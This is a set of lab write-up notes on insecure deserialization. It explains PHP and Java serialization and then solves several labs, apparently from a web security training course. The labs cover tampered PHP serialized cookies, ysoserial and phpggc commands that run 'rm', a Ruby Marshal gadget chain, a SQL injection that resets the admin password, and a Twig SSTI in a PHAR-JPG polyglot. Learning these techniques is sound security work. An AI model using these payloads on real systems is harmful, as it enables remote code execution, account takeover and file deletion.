# Insecure Deserialization
- **Serialization** is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes.
- **Deserialization** is the process of restoring this byte stream to a fully functional replica of the original object, in the exact state as when it was serialized.
- **Insecure deserialization** is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.

## PHP serialization format
*Take note of `serialize()` and `unserialize()` in code.*

    $user->name = "carlos";
    $user->isLoggedIn = true;

When serialized, this object may look something like this:

    O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}

This can be interpreted as follows:
- `O:4:"User"` - An object with the 4-character class name "User"
- `2` - the object has 2 attributes
- `s:4:"name"` - The key of the first attribute is the 4-character string "name"
- `s:6:"carlos"` - The value of the first attribute is the 6-character string "carlos"
- `s:10:"isLoggedIn"` - The key of the second attribute is the 10-character string "isLoggedIn"
- `b:1` - The value of the second attribute is the boolean value true

## Java serialization format
*Take note of `readObject()` in code.*
Serialized Java objects always begin with the same bytes, which are encoded as `ac ed` in hexadecimal and `rO0` in Base64.


### LAB: Modifying serialized objects
Decode the cookie value with Base64. Got this serialized string:

    O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}

Change it to gain admin access:

    O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}

Encode it using Base64 then URL encode it and send that along with any request to gain access to the admin panel.

### LAB: Modifying serialized data types
*Note: in PHP `5 == "5 of something"` is still treated as `5 == 5`. In PHP 7.x and earlier `0 == "abcxyz"` is treated as `0 == 0`.*
Decode the cookie value with Base64. Got this serialized string:

    O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"blu9dst41vo6k1zuzp6yx3q8gj87mvyc";}==

Change it to gain admin access by make use of the above note:

    O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}==

The `access_token` value is now an integer `0` which when comparing with any string that doesn't start with a number will return true (base on the above note). Encode it using Base64 then URL encode it and send that along with any request to gain access to the admin panel.

### LAB: Using application functionality to exploit insecure deserialization
Decode the cookie value with Base64. Got this serialized string:

    O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"fvb13kfexkwmv9jksvk12nkgxcs1e8yl";s:11:"avatar_link";s:18:"users/gregg/avatar";}

Change the `avatar_link` value, so when deleting the account, it also delete Carlos's file:

    O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"fvb13kfexkwmv9jksvk12nkgxcs1e8yl";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}

Use this cookie (Base64 and URL encode it) along with the `POST /my-account/delete HTTP/2` request to solve the lab.

### LAB: Arbitrary object injection in PHP
Crawl through the source code and found this comment: 

    <!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->

Try visit this by retrieving an editor-generated backup file of this file using: `/libs/CustomTemplate.php~` and found the source code:

    <?php

    class CustomTemplate {
        private $template_file_path;
        private $lock_file_path;

        public function __construct($template_file_path) {
            $this->template_file_path = $template_file_path;
            $this->lock_file_path = $template_file_path . ".lock";
        }

        private function isTemplateLocked() {
            return file_exists($this->lock_file_path);
        }

        public function getTemplate() {
            return file_get_contents($this->template_file_path);
        }

        public function saveTemplate($template) {
            if (!isTemplateLocked()) {
                if (file_put_contents($this->lock_file_path, "") === false) {
                    throw new Exception("Could not write to " . $this->lock_file_path);
                }
                if (file_put_contents($this->template_file_path, $template) === false) {
                    throw new Exception("Could not write to " . $this->template_file_path);
                }
            }
        }

        function __destruct() {
            // Carlos thought this would be a good idea
            if (file_exists($this->lock_file_path)) {
                unlink($this->lock_file_path);
            }
        }
    }

    ?>

This shows that we can exploit the `CustomTemplate` class to call the magic method `__destruct()` to delete a specified file which will be called automatically.
Decode the cookie value with Base64. Got this serialized string:  

    O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"mjyl9cmlcdq0fofxrciwi06ti0hrmlyc";}

Change it to call the `CustomTemplate` class with the file we want to delete as the value for `lock_file_path`:

    O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}

Use this cookie (Base64 and URL encode it) along with any request to delete the specified file.

### LAB: Exploiting Java deserialization with Apache Commons
> Note: A "gadget" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal. The attacker's goal might simply be to invoke a method that will pass their input into another gadget. By chaining multiple gadgets together in this way, an attacker can potentially pass their input into a dangerous "sink gadget", where it can cause maximum damage. You can use the following ones to help you quickly detect insecure deserialization on virtually any server: 
> - The URLDNS chain triggers a DNS lookup for a supplied URL. Most importantly, it does not rely on the target application using a specific vulnerable library and works in any known Java version. If you spot a serialized object in the traffic, you can try using this gadget chain to generate an object that triggers a DNS interaction with the Burp Collaborator server. If it does, you can be sure that deserialization occurred on your target.
> - JRMPClient: it causes the server to try establishing a TCP connection to the supplied IP address. Note that you need to provide a raw IP address rather than a hostname. This chain may be useful in environments where all outbound traffic is firewalled, including DNS lookups. You can try generating payloads with two different IP addresses: a local one and a firewalled, external one. If the application responds immediately for a payload with a local address, but hangs for a payload with an external address, causing a delay in the response, this indicates that the gadget chain worked because the server tried to connect to the firewalled address. In this case, the subtle time difference in responses can help you to detect whether deserialization occurs on the server, even in blind cases.

Use `ysoserial` to generate a payload that could exploit this vulnerability.
First download the `ysoserial-all.jar` from Github. 
Use this command to generate a Base64 encoded payload with new line characters removed:

    java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0

Copy the returned value and URL encode it before sending as a cookie value along with any request to solve the lab.

### LAB: Exploiting PHP deserialization with a pre-built gadget chain
Download the `phpggc` tool for generating PHP gadget chain payloads:

    git clone https://github.com/ambionics/phpggc.git
    cd phpggc
    chmod +x phpggc.php

First login to the given account and try modifying the cookie to something arbitrary $\to$ got the error:

    Internal Server Error: Symfony Version: 4.3.6

From this we know that we can use `Symfony/RCE4` to generate the payload. Generate gadget chain payload using `phpggc` (Base64 encode it and remove the new line characters):

    php phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0

Now investigate the cookie value, it contains a token that is Base64 encoded and a HMAC-SHA1 signature of that token:

    {"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ2dGxzeWRvNGExeDBxbm56Z2V6OXdsdTY2YTl1cWpqZSI7fQ==","sig_hmac_sha1":"31b2f4a2e885d90408d979f0c1a58760d6794b67"}

Base64 decode the token:

    {"token":"O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"vtlsydo4a1x0qnnzgez9wlu66a9uqjje";}","sig_hmac_sha1":"31b2f4a2e885d90408d979f0c1a58760d6794b67"}

Now in order to successfully inject the gadget chain payload we need to find the key to sign it. Fortunately, there is a comment in the source code showing us where to find it:

    <!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->

Visit that page and look for the `SECRET_KEY` value. Now paste all the needed value in to the [PHP code](./HMAC-SHA1-sign.php) to generate a valid cookie. Use that along with any request to solve the lab.

### LAB: Exploiting Ruby deserialization using a documented gadget chain
This lab uses Ruby on Rails framework. Go read this [article](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) to know more about how this gadget chain payload is created:

    # Autoload the required classes
    Gem::SpecFetcher
    Gem::Installer

    # prevent the payload from running when we Marshal.dump it
    module Gem
    class Requirement
        def marshal_dump
        [@requirements]
        end
    end
    end

    wa1 = Net::WriteAdapter.new(Kernel, :system)

    rs = Gem::RequestSet.allocate
    rs.instance_variable_set('@sets', wa1)
    rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

    wa2 = Net::WriteAdapter.new(rs, :resolve)

    i = Gem::Package::TarReader::Entry.allocate
    i.instance_variable_set('@read', 0)
    i.instance_variable_set('@header', "aaa")


    n = Net::BufferedIO.allocate
    n.instance_variable_set('@io', i)
    n.instance_variable_set('@debug_output', wa2)

    t = Gem::Package::TarReader.allocate
    t.instance_variable_set('@io', n)

    r = Gem::Requirement.allocate
    r.instance_variable_set('@requirements', t)

    payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
    puts Base64.encode64(payload)

Go to [Ruby Online Compiler](https://www.jdoodle.com/execute-ruby-online), choose language version `2.6.5` and compile this code. Copy the output and use it as the cookie value along with any request to solve the lab.

### LAB: Developing a custom gadget chain for Java deserialization
Crawl through the source code, found a suspicous comment:
    
    <!-- <a href=/backup/AccessTokenUser.java>Example user</a> -->

Visit `/backup`, found the `ProductTemplate.java`:

    package data.productcatalog;

    import common.db.JdbcConnectionBuilder;

    import java.io.IOException;
    import java.io.ObjectInputStream;
    import java.io.Serializable;
    import java.sql.Connection;
    import java.sql.ResultSet;
    import java.sql.SQLException;
    import java.sql.Statement;

    public class ProductTemplate implements Serializable
    {
        static final long serialVersionUID = 1L;

        private final String id;
        private transient Product product;

        public ProductTemplate(String id)
        {
            this.id = id;
        }

        private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
        {
            inputStream.defaultReadObject();

            JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                    "org.postgresql.Driver",
                    "postgresql",
                    "localhost",
                    5432,
                    "postgres",
                    "postgres",
                    "password"
            ).withAutoCommit();
            try
            {
                Connection connect = connectionBuilder.connect(30);
                String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
                Statement statement = connect.createStatement();
                ResultSet resultSet = statement.executeQuery(sql);
                if (!resultSet.next())
                {
                    return;
                }
                product = Product.from(resultSet);
            }
            catch (SQLException e)
            {
                throw new IOException(e);
            }
        }

        public String getId()
        {
            return id;
        }

        public Product getProduct()
        {
            return product;
        }
    }

This code provides a SQL injection vulnerability through the deserialization process. To exploit this, we need to create a valid serialized session cookie to inject our payload (`'; UPDATE users SET password = '1' WHERE username = 'administrator' --`). Run the code in [Java Serialized Payload](./JavaSerializedPayload/src/App.java) and copy the output to use as the cookie value along with any request to change the administrator's password to `1`. Login in using `administrator:1` and successfully delete user `carlos`.

### LAB: Developing a custom gadget chain for PHP deserialization
Crawl through the source code, found a suspicous comment:

    <!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated -->

Visit `/cgi-bin/libs/CustomTemplate.php~` to see its backup file since the original is removed. Found this PHP file:

    <?php

    class CustomTemplate {
        private $default_desc_type;
        private $desc;
        public $product;

        public function __construct($desc_type='HTML_DESC') {
            $this->desc = new Description();
            $this->default_desc_type = $desc_type;
            // Carlos thought this is cool, having a function called in two places... What a genius
            $this->build_product();
        }

        public function __sleep() {
            return ["default_desc_type", "desc"];
        }

        public function __wakeup() {
            $this->build_product();
        }

        private function build_product() {
            $this->product = new Product($this->default_desc_type, $this->desc);
        }
    }

    class Product {
        public $desc;

        public function __construct($default_desc_type, $desc) {
            $this->desc = $desc->$default_desc_type;
        }
    }

    class Description {
        public $HTML_DESC;
        public $TEXT_DESC;

        public function __construct() {
            // @Carlos, what were you thinking with these descriptions? Please refactor!
            $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
            $this->TEXT_DESC = 'This product is cool in text';
        }
    }

    class DefaultMap {
        private $callback;

        public function __construct($callback) {
            $this->callback = $callback;
        }

        public function __get($name) {
            return call_user_func($this->callback, $name);
        }
    }

    ?>

Notice the `call_user_func` function in class `DefaultMap` which will execute a function named `$this->callback` with the argument specified in `$name`. Therefore, to solve the lab we need to make the server call the `__get()` function in `DefaultMap` class with `$this->callback=system` and `$name='rm /home/carlos/morale.txt'`.
Notice a chain:

    CustomTemplate.__construct() -> CustomTemplate.build_product() -> Product.__construct()

If we pass `$default_desc_type='rm /home/carlos/morale.txt'` and `$desc=DefaultMap(system)`, the `Product.__construct()` will call:

    DefaultMap(system).__get('rm /home/carlos/morale.txt')

This will finally call this function in PHP:

    system('rm /home/carlos/morale.txt')

### LAB: Using PHAR deserialization to deploy a custom gadget chain
Try upload a valid image, notice the file path: `/cgi-bin/avatar.php?avatar=wiener`. Go visit `/cgi-bin` and found 2 interesting files:
`CustomTemplate.php~`:

    <?php

    class CustomTemplate {
        private $template_file_path;

        public function __construct($template_file_path) {
            $this->template_file_path = $template_file_path;
        }

        private function isTemplateLocked() {
            return file_exists($this->lockFilePath());
        }

        public function getTemplate() {
            return file_get_contents($this->template_file_path);
        }

        public function saveTemplate($template) {
            if (!isTemplateLocked()) {
                if (file_put_contents($this->lockFilePath(), "") === false) {
                    throw new Exception("Could not write to " . $this->lockFilePath());
                }
                if (file_put_contents($this->template_file_path, $template) === false) {
                    throw new Exception("Could not write to " . $this->template_file_path);
                }
            }
        }

        function __destruct() {
            // Carlos thought this would be a good idea
            @unlink($this->lockFilePath());
        }

        private function lockFilePath()
        {
            return 'templates/' . $this->template_file_path . '.lock';
        }
    }

    ?>

`Blog.php~`:

    <?php

    require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php');

    class Blog {
        public $user;
        public $desc;
        private $twig;

        public function __construct($user, $desc) {
            $this->user = $user;
            $this->desc = $desc;
        }

        public function __toString() {
            return $this->twig->render('index', ['user' => $this->user]);
        }

        public function __wakeup() {
            $loader = new Twig_Loader_Array([
                'index' => $this->desc,
            ]);
            $this->twig = new Twig_Environment($loader);
        }

        public function __sleep() {
            return ["user", "desc"];
        }
    }

    ?>

Notice that PHP automatically deserializes objects when calling `file_exists()` on a `phar://` stream. If we can set `template_file_path` to `phar://wiener`, it will deserialize our malicious avatar file.

Studying the code, we found a sink that our RCE would be passed into is in the `__wakeup()` magic method where we can inject server-side template into Twig template engine via `$desc='{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}'`. 

Step-by-Step Execution Chain:
| **Step** | **Action** | **Why It Happens?** |
|----------|-----------|---------------------|
| **1** | Upload PHAR-JPG payload | The PHAR file is stored as `wiener.jpg` |
| **2** | Modify request: `GET /cgi-bin/avatar.php?avatar=phar://wiener` | Forces PHP to read the PHAR archive |
| **3** | `file_exists('phar://wiener')` runs in `CustomTemplate::isTemplateLocked()` | **Triggers PHAR deserialization** |
| **4** | `CustomTemplate` object in metadata is deserialized | The `Blog` object inside it is processed |
| **5** | Blog's `__wakeup()` runs | Twig is initialized with our **SSTI payload** from `Blog->desc` |
| **6** | SSTI payload executes | Executes `rm /home/carlos/morale.txt` |

Use this PHP script to make use of the chain and call the delete function:

    class CustomTemplate {}
    class Blog {}
    $object = new CustomTemplate;
    $blog = new Blog;
    $blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
    $blog->user = 'user';
    $object->template_file_path = $blog;

Now creating a PHAR-JPG polyglot containing this PHP script using [phar-jpg-polyglot](https://github.com/kunte0/phar-jpg-polyglot). Paste the above script inside `phar_jpg_polyglot.php` under `// pop exploit class, inject class here`. Run the script using `php -c php.ini phar_jpg_polyglot.php` to generate `out.jpg`. This is how the serialized object looks like:

    O:14:"CustomTemplate":1:{s:18:"template_file_path";O:4:"Blog":2:{s:4:"desc";s:106:"{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}";s:4:"user";s:4:"user";}}

Upload `out.jpg` and visit the link `/cgi-bin/avatar.php?avatar=phar://wiener` to make the deserialization process happen and solve the lab.